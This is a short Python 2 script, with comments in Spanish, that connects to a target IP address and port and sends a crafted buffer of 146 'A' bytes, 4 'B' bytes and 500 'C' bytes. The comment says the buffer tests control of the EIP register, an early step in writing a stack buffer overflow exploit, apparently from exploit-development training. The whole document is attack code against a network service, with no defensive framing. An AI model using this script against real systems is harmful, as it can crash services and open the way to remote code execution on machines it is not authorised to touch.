#!/usr/bin/python2

import socket, sys

if len(sys.argv) < 3:
	print ("\n Usage: python " + sys.argv[0] + " <ip address> <port>\n")
	sys.exit(0)

ipADD = sys.argv[1]
rPort = sys.argv[2]

if __name__=='__main__':

# COMPROBACION del control del EIP
 buffer = "A"*146 + "B"*4 + "C"*500

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ipADD, int(rPort)))
 miData = buffer + '\r\n'
 s.send(miData)
 data = s.recv(1024)
